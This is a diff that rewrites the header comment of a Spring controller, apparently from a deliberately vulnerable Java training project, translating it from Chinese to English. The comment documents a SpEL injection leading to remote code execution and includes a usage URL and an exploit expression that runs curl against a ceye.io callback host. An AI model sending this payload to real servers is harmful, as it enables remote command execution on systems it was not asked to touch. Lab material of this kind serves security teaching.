@@ -7,12 +7,12 @@ import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.ResponseBody;
 import javax.servlet.http.HttpServletRequest;
 
-/*
-    * Author: JoyChou
-    * Date:   2019年01月17日
-    * Desc:   SPEL导致的RCE
-    * Usage:  http://localhost:8080/spel/rce?expression=xxx(xxx为exp的URL编码后的值)
-    * Exp:    T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
+/**
+    @author   JoyChou (joychou@joychou.org)
+    @date     2019.01.17
+    @esc      SPEL leas to RCE
+    @usage    http://localhost:8080/spel/rce?expression=xxx. xxx is urlencode(exp)
+    @exp      T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
  */
 
 @Controller
